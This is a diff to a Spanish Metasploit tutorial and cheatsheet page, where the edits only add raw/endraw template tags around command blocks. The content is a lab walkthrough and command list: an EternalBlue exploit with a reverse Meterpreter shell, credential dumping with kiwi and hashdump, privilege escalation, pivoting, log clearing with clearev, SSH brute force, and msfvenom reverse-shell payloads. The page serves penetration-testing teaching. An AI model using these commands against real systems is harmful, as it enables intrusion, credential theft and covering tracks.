@@ -138,6 +138,7 @@ El uso no autorizado puede constituir delito.
 
 ## Ejemplo básico de uso de msfconsole
 ### Inicialización y explotación simple
+{% raw %}
 ```bash
 msfconsole
 use exploit/windows/smb/ms17_010_eternalblue
@@ -145,7 +146,8 @@ set RHOSTS 192.168.1.10
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.100
 exploit
-````
+```
+{% endraw %}`
 
 ## Automatización y scripting
 
@@ -545,11 +547,13 @@ Auditoría autorizada sobre una red interna de laboratorio.
 
 ## Configuración inicial de Metasploit
 ### Inicialización de base de datos
+{% raw %}
 ```bash
 msfdb init
 msfconsole
 db_status
-````
+```
+{% endraw %}`
 
 Resultado esperado:
 - Base de datos conectada
@@ -559,9 +563,11 @@ Resultado esperado:
 
 ### Escaneo con Nmap
 
+{% raw %}
 ```bash
 nmap -sS -sV -O -Pn 192.168.56.101 -oA scan_objetivo
 ```
+{% endraw %}
 
 Puertos relevantes detectados:
 - 445/tcp SMB
@@ -569,19 +575,23 @@ Puertos relevantes detectados:
 
 ### Importación del escaneo a Metasploit
 
+{% raw %}
 ```bash
 db_import scan_objetivo.xml
 hosts
 services
 ```
+{% endraw %}
 
 ## Identificación de vulnerabilidad
 
 ### Búsqueda de exploits relacionados
 
+{% raw %}
 ```bash
 search type:exploit platform:windows smb
 ```
+{% endraw %}
 
 Exploit seleccionado:
 - MS17-010 (EternalBlue)
@@ -591,6 +601,7 @@ Exploit seleccionado:
 
 ### Configuración del exploit
 
+{% raw %}
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 192.168.56.101
@@ -598,18 +609,23 @@ set LHOST 192.168.56.10
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set EXITFUNC thread
 ```
+{% endraw %}
 
 Validación previa:
 
+{% raw %}
 ```bash
 check
 ```
+{% endraw %}
 
 ### Ejecución del exploit
 
+{% raw %}
 ```bash
 exploit
 ```
+{% endraw %}
 
 Resultado esperado:
 - Sesión Meterpreter activa
@@ -619,11 +635,13 @@ Resultado esperado:
 
 ### Enumeración inicial
 
+{% raw %}
 ```bash
 sysinfo
 getuid
 ipconfig
 ```
+{% endraw %}
 
 Objetivo:
 - Identificar sistema operativo
@@ -634,17 +652,21 @@ Objetivo:
 
 ### Enumeración del sistema
 
+{% raw %}
 ```bash
 run post/windows/gather/enum_logged_on_users
 run post/windows/gather/enum_applications
 ```
+{% endraw %}
 
 ### Dumping de credenciales
 
+{% raw %}
 ```bash
 load kiwi
 creds_all
 ```
+{% endraw %}
 
 Uso:
 - Validar impacto real
@@ -654,15 +676,19 @@ Uso:
 
 ### Sugerencia automática
 
+{% raw %}
 ```bash
 getsystem
 ```
+{% endraw %}
 
 ### Enumeración de vectores locales
 
+{% raw %}
 ```bash
 run post/multi/recon/local_exploit_suggester
 ```
+{% endraw %}
 
 Selección manual según resultados:
 - Exploits locales compatibles
@@ -672,15 +698,19 @@ Selección manual según resultados:
 
 ### Configuración de pivoting
 
+{% raw %}
 ```bash
 run autoroute -s 192.168.100.0/24
 ```
+{% endraw %}
 
 Verificación:
 
+{% raw %}
 ```bash
 route print
 ```
+{% endraw %}
 
 Uso:
 - Acceso a subredes internas
@@ -690,16 +720,20 @@ Uso:
 
 ### Eliminación de artefactos
 
+{% raw %}
 ```bash
 clearev
 ```
+{% endraw %}
 
 ### Cierre de sesión
 
+{% raw %}
 ```bash
 exit
 sessions -K
 ```
+{% endraw %}
 
 ## Evidencias para reporte
 
@@ -735,15 +769,18 @@ Este caso demuestra:
 # Metasploit — Cheatsheet de Comandos (Estado 2025)
 
 ## Gestión básica de msfconsole
+{% raw %}
 ```bash
 msfconsole
 exit
 version
 banner
-````
+```
+{% endraw %}`
 
 ## Ayuda y navegación
 
+{% raw %}
 ```bash
 help
 ?
@@ -751,35 +788,43 @@ help exploit
 back
 info
 ```
+{% endraw %}
 
 ## Búsqueda de módulos
 
+{% raw %}
 ```bash
 search ms17-010
 search type:exploit platform:windows
 search name:smb type:auxiliary
 search cve:2023
 ```
+{% endraw %}
 
 ## Uso de módulos
 
+{% raw %}
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
 use auxiliary/scanner/ssh/ssh_login
 use post/windows/gather/hashdump
 ```
+{% endraw %}
 
 ## Información y opciones del módulo
 
+{% raw %}
 ```bash
 show info
 show options
 show payloads
 show targets
 ```
+{% endraw %}
 
 ## Configuración de opciones
 
+{% raw %}
 ```bash
 set RHOSTS 192.168.1.10
 set RPORT 445
@@ -789,25 +834,31 @@ set PAYLOAD windows/x64/meterpreter/reverse_tcp
 setg LHOST 192.168.1.100
 unset RHOSTS
 ```
+{% endraw %}
 
 ## Ejecución de módulos
 
+{% raw %}
 ```bash
 run
 exploit
 exploit -j
 ```
+{% endraw %}
 
 ## Gestión de jobs
 
+{% raw %}
 ```bash
 jobs
 jobs -l
 jobs -k 1
 ```
+{% endraw %}
 
 ## Base de datos y workspace
 
+{% raw %}
 ```bash
 msfdb init
 db_status
@@ -816,35 +867,43 @@ workspace -a cliente_A
 workspace cliente_A
 workspace -d cliente_A
 ```
+{% endraw %}
 
 ## Hosts y servicios
 
+{% raw %}
 ```bash
 hosts
 hosts -c address,os_name
 services
 services -p 445
 ```
+{% endraw %}
 
 ## Importación de escaneos
 
+{% raw %}
 ```bash
 db_import scan.xml
 db_import scan.nmap
 db_import scan.gnmap
 ```
+{% endraw %}
 
 ## Sesiones
 
+{% raw %}
 ```bash
 sessions
 sessions -i 1
 sessions -k 1
 sessions -K
 ```
+{% endraw %}
 
 ## Comandos Meterpreter básicos
 
+{% raw %}
 ```bash
 sysinfo
 getuid
@@ -855,101 +914,127 @@ pwd
 ls
 cd
 ```
+{% endraw %}
 
 ## Transferencia de archivos
 
+{% raw %}
 ```bash
 upload file.exe
 download secret.txt
 ```
+{% endraw %}
 
 ## Gestión de procesos
 
+{% raw %}
 ```bash
 ps
 migrate 1234
 kill 1234
 ```
+{% endraw %}
 
 ## Credenciales y hashes
 
+{% raw %}
 ```bash
 hashdump
 load kiwi
 creds_all
 creds
 ```
+{% endraw %}
 
 ## Enumeración post-explotación
 
+{% raw %}
 ```bash
 run post/windows/gather/enum_logged_on_users
 run post/windows/gather/enum_applications
 run post/windows/gather/checkvm
 ```
+{% endraw %}
 
 ## Escalada de privilegios
 
+{% raw %}
 ```bash
 getsystem
 run post/multi/recon/local_exploit_suggester
 ```
+{% endraw %}
 
 ## Pivoting y rutas
 
+{% raw %}
 ```bash
 run autoroute -s 192.168.10.0/24
 route print
 route delete 192.168.10.0
 ```
+{% endraw %}
 
 ## SOCKS proxy
 
+{% raw %}
 ```bash
 use auxiliary/server/socks_proxy
 set SRVPORT 1080
 run
 ```
+{% endraw %}
 
 ## Escaneo con módulos auxiliares
 
+{% raw %}
 ```bash
 use auxiliary/scanner/portscan/tcp
 set RHOSTS 192.168.1.0/24
 run
 ```
+{% endraw %}
 
 ## Fuerza bruta
 
+{% raw %}
 ```bash
 use auxiliary/scanner/ssh/ssh_login
 set USER_FILE users.txt
 set PASS_FILE passwords.txt
 run
 ```
+{% endraw %}
 
 ## Payloads y msfvenom
 
 ### Listar payloads
 
+{% raw %}
 ```bash
 msfvenom -l payloads
 ```
+{% endraw %}
 
 ### Payload Windows
 
+{% raw %}
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
 ```
+{% endraw %}
 
 ### Payload Linux
 
+{% raw %}
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
 ```
+{% endraw %}
 
 ## Listeners
 
+{% raw %}
 ```bash
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
@@ -957,37 +1042,46 @@ set LHOST 192.168.1.100
 set LPORT 4444
 run
 ```
+{% endraw %}
 
 ## Limpieza y evasión básica
 
+{% raw %}
 ```bash
 clearev
 background
 ```
+{% endraw %}
 
 ## Automatización
 
 ### Resource scripts
 
+{% raw %}
 ```bash
 msfconsole -r script.rc
 ```
+{% endraw %}
 
 ## Reporting
 
+{% raw %}
 ```bash
 loot
 notes
 creds
 ```
+{% endraw %}
 
 ## Comandos útiles rápidos
 
+{% raw %}
 ```bash
 setg DisablePayloadHandler true
 check
 sessions -v
 ```
+{% endraw %}
 
 ## Relación con [Pentesting](/ciberseguridad/pentesting/)
 
